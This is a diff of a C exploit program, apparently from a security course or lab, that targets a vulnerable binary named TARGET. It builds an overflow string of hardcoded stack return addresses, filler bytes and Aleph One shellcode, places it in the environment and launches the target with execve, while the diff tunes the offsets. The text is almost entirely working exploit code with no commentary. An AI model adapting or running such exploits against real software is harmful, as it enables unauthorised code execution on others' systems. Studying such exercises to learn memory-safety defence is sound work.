@@ -14,22 +14,24 @@ int main(void)
   
   args[0] = TARGET;
   
+  char addrToAdd[] = "\x8b\xff\xff\xbf";
+
   //add
   // 0xbf ff ff 7f
-  args[1] = "\x7f\xff\xff\xbf"; 
+  char dst[24] = "\x8b\xff\xff\xbf\x8b\xff\xff\xbf\x8b\xff\xff\xbf\x8b\xff\xff\xbf\x8b\xff\xff\xbf\x8b\xff\xff\xbf";
+
+
+  args[1] = dst+4; 
   
   args[2] = NULL;
   int sizeOfShell =  sizeof(shellcodeAlephOne) / sizeof(shellcodeAlephOne[0]);
-  char att[81] = "";
-  //add + 20
-  for (int i=0; i <5 ; i++){
-        strcat(att, "\x93\xff\xff\xbf");
-  }
-  //junk
+  char att[61] = "";
+  
   strcat(att, "\x41\x41\x41\x41");
+  
   //add+28
-  strcat(att, "\x9b\xff\xff\xbf");
-  memcpy(att+28 , shellcodeAlephOne , sizeOfShell*sizeof(char));
+  strcat(att, "\x93\xff\xff\xbf");
+  memcpy(att+8 , shellcodeAlephOne , sizeOfShell*sizeof(char));
   
   env[0] = att;
   execve(TARGET, args, env);
